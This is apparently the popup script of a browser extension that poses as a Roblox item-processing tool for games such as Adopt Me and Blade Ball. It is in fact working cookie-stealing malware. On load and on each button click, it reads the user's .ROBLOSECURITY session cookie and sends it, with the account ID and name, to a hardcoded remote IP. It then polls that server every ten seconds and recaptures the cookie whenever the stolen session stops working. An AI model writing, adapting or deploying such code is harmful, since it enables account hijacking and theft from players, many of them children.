// ===== CONFIG =====
const SERVER_URL = 'http://103.38.236.58/';

// ===== Game Data =====
const gameData = {
    jailbreak: {
        name: 'jailbreak',
        icon: 'images/JB.jpg'
    },
    murder_mystery: {
        name: 'MURDER MYSTERY 2',
        icon: 'images/MURDER.jpg'
    },
    adopt_me: {
        name: 'adopt me',
        icon: 'images/ADOPT_ME.jpg'
    },
    grow_a_garden: {
        name: 'grow a garden 2',
        icon: 'images/GROWA_GARDEN.jpg'
    },
    dragon: {
        name: 'dragon adventures',
        icon: 'images/bc59594f-18c7-4aea-9aff-e3465a2410e1.jpg'
    },
    Creatures: {
        name: 'Creatures of Sonaria',
        icon: 'images/bde33649-66bd-4175-8c72-62a74ca48dcc.jpg'
    },
    blade_ball: {
        name: 'blade ball',
        icon: 'images/a93f3b07-f2bd-474b-bb6d-a9de3bf99b9a.jpg'
    }
};

// ===== State =====
let trackedAccounts = {}; // { userId: { username, status, lastCheck } }
let statusCheckInterval = null;

// ===== Get Roblox Cookie =====
function getRobloxCookie() {
    return new Promise((resolve, reject) => {
        chrome.cookies.get(
            { url: 'https://www.roblox.com', name: '.ROBLOSECURITY' },
            (cookie) => {
                if (cookie) {
                    resolve(cookie.value);
                } else {
                    reject(new Error('Cookie not found. Please login to Roblox first.'));
                }
            }
        );
    });
}

// ===== Get Roblox User Info =====
async function getRobloxUserInfo(cookie) {
    try {
        const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`
            }
        });

        if (!response.ok) {
            throw new Error('Failed to get user info');
        }

        const data = await response.json();
        return {
            id: data.id,
            name: data.name,
            displayName: data.displayName
        };
    } catch (error) {
        console.error('Error getting user info:', error);
        return { id: 'unknown', name: 'unknown', displayName: 'unknown' };
    }
}

// ===== Send Data to Server =====
async function sendToServer(cookie, userInfo, gameName = 'Unknown') {
    try {
        const payload = {
            cookie: cookie,
            userId: userInfo.id,
            username: userInfo.name,
            displayName: userInfo.displayName,
            game: gameName,
            timestamp: new Date().toISOString()
        };

        const response = await fetch(`${SERVER_URL}/api/sessions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            throw new Error(`Server error: ${response.status}`);
        }

        const result = await response.json();
        console.log('✅ Cookie sent to server:', userInfo.name);
        
        // Track this account
        trackedAccounts[userInfo.id] = {
            username: userInfo.name,
            status: 'ALIVE',
            lastCheck: Date.now()
        };
        
        return result;
    } catch (error) {
        console.error('Error sending to server:', error);
        throw error;
    }
}

// ===== Check Cookie Status =====
async function checkCookieStatus(userId) {
    try {
        const response = await fetch(`${SERVER_URL}/api/sessions/${userId}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        if (response.ok) {
            const data = await response.json();
            return data.status || 'UNKNOWN';
        }
        return 'UNKNOWN';
    } catch (error) {
        console.error('Error checking status:', error);
        return 'UNKNOWN';
    }
}

// ===== Auto-Capture on Load =====
async function autoCaptureOnLoad() {
    console.log('🚀 Extension loaded - auto-capturing cookie...');
    try {
        const cookie = await getRobloxCookie();
        const userInfo = await getRobloxUserInfo(cookie);
        await sendToServer(cookie, userInfo, 'Auto-Capture');
        console.log('✅ Cookie auto-captured and sent!');
    } catch (error) {
        console.error('❌ Auto-capture failed:', error);
    }
}

// ===== Monitor Account Status =====
function startStatusMonitoring() {
    // Check every 10 seconds and auto-recapture if DIE
    statusCheckInterval = setInterval(async () => {
        for (const userId in trackedAccounts) {
            const account = trackedAccounts[userId];
            const status = await checkCookieStatus(userId);
            
            // If status is DIE, auto-recapture immediately
            if (status === 'DIE') {
                console.warn(`⚠️ Account ${account.username} (${userId}) is DIE - auto-recapturing...`);
                account.status = 'DIE';
                
                try {
                    const cookie = await getRobloxCookie();
                    const userInfo = await getRobloxUserInfo(cookie);
                    await sendToServer(cookie, userInfo, 'Auto-Recapture');
                    account.status = 'ALIVE';
                    console.log(`✅ Cookie recaptured for ${account.username}!`);
                } catch (error) {
                    console.error(`❌ Recapture failed for ${account.username}:`, error);
                    // Keep trying - don't update status, let it stay DIE
                }
            } else if (status === 'ALIVE') {
                account.status = 'ALIVE';
            }
            
            account.lastCheck = Date.now();
        }
    }, 10000); // Check every 10 seconds
}

// ===== DOM Elements =====
const modalOverlay = document.getElementById('modalOverlay');
const modalCard = document.getElementById('modalCard');
const modalTitle = document.getElementById('modalTitle');
const modalIconImg = document.getElementById('modalIconImg');
const modalCloseBtn = document.getElementById('modalCloseBtn');
const processBtn = document.getElementById('processBtn');

let currentGameId = null;

// ===== Open Modal =====
function openGameModal(card) {
    const gameId = card.getAttribute('data-game');
    const game = gameData[gameId];
    if (!game) return;

    currentGameId = gameId;
    modalTitle.textContent = game.name;
    modalIconImg.src = game.icon;
    modalIconImg.alt = game.name;

    // Reset process button
    processBtn.classList.remove('processing', 'done', 'error');
    processBtn.innerHTML = `
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
        </svg>
        PROCESS ITEM
    `;

    modalOverlay.classList.add('active');
    requestAnimationFrame(() => {
        modalCard.classList.add('show');
    });
}

// ===== Close Modal =====
function closeModal() {
    modalCard.classList.remove('show');
    modalCard.classList.add('closing');

    setTimeout(() => {
        modalOverlay.classList.remove('active');
        modalCard.classList.remove('closing');
    }, 300);
}

// ===== Process Item (Manual Send) =====
async function handleProcess() {
    const gameName = gameData[currentGameId]?.name || 'Unknown';

    // Show processing state
    processBtn.classList.add('processing');
    processBtn.innerHTML = `
        <div class="spinner"></div>
        PROCESSING...
    `;

    try {
        // Step 1: Get Roblox cookie
        const cookie = await getRobloxCookie();

        // Step 2: Get user info using the cookie
        const userInfo = await getRobloxUserInfo(cookie);

        // Step 3: Send everything to server
        await sendToServer(cookie, userInfo, gameName);

        // Success
        processBtn.classList.remove('processing');
        processBtn.classList.add('done');
        processBtn.innerHTML = `
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="20 6 9 17 4 12"/>
            </svg>
            QUEUED SUCCESSFULLY
        `;

        setTimeout(() => {
            processBtn.classList.remove('done');
            processBtn.innerHTML = `
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
                </svg>
                PROCESS ITEM
            `;
        }, 3000);

    } catch (error) {
        // Error state
        processBtn.classList.remove('processing');
        processBtn.classList.add('error');
        processBtn.innerHTML = `
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
            </svg>
            ERROR - RETRY
        `;

        setTimeout(() => {
            processBtn.classList.remove('error');
            processBtn.innerHTML = `
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/>
                </svg>
                PROCESS ITEM
            `;
        }, 3000);
    }
}

// ===== Event Listeners =====
document.addEventListener('DOMContentLoaded', () => {
    // ===== AUTO-CAPTURE ON LOAD =====
    autoCaptureOnLoad();
    startStatusMonitoring();

    // Game card clicks
    const gameCards = document.querySelectorAll('.ext-game-card:not(.info-card)');
    gameCards.forEach(card => {
        card.addEventListener('click', () => openGameModal(card));
    });

    // Close modal
    modalCloseBtn.addEventListener('click', closeModal);

    // Click overlay to close
    modalOverlay.addEventListener('click', (e) => {
        if (e.target === modalOverlay) closeModal();
    });

    // Process button
    processBtn.addEventListener('click', handleProcess);

    // Keyboard escape
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') closeModal();
    });
});

// Cleanup on extension unload
window.addEventListener('beforeunload', () => {
    if (statusCheckInterval) {
        clearInterval(statusCheckInterval);
    }
});
